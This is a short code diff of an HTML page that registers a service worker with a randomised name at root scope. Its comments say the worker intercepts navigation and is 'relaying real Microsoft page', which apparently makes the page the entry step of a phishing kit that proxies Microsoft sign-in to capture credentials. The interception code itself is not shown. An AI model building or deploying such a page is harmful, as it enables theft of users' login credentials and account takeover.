@@ -1,19 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-</head>
+<head><meta charset="UTF-8"></head>
 <body>
     <script>
         if ("serviceWorker" in navigator) {
             navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
-                .then(() => {
-                    // Do NOT redirect – let the SW intercept the navigation.
-                    console.log("SW registered – relaying real Microsoft page...");
-                })
+                .then(() => console.log("SW registered – relaying real Microsoft page"))
                 .catch(err => console.error("SW registration failed:", err));
-        } else {
-            console.error("Service workers not supported");
         }
     </script>
 </body>
